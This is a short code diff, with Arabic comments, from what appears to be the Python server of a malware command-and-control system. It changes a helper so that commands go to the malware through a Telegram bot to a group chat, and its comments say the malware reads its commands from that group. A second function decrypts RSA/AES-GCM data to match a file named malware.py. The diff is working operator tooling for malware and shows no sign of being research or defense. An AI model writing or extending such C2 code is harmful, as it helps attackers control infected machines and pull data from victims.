@@ -312,12 +312,12 @@ CLIENT_OFFLINE_AFTER_SEC = int(os.environ.get("CLIENT_OFFLINE_AFTER_SEC", "120")
 # ── دوال مساعدة للتيليجرام ──────────────────────────────────────────────────
 
 def _tg_send_to_channel(message: str):
-    """إرسال رسالة على قناة التيليجرام باتجاه المالوير"""
+    """المالوير يقرأ الأوامر والردود من الجروب فقط — نرسل إلى GROUP_ID."""
+    url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
     try:
-        url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
-        requests.post(url, json={"chat_id": C2_CHANNEL_ID, "text": message}, timeout=5)
+        requests.post(url, json={"chat_id": C2_GROUP_ID, "text": message}, timeout=8)
     except Exception as e:
-        logger.error(f"TG send error: {e}")
+        logger.error(f"TG send error (group): {e}")
 
 def _tg_decrypt_first_message(encrypted_key_b64: str, encrypted_data_b64: str):
     """RSA فك تشفير مفتاح AES، ثم AES-GCM فك تشفير البيانات (مطابق لما يستخدمه malware.py)"""
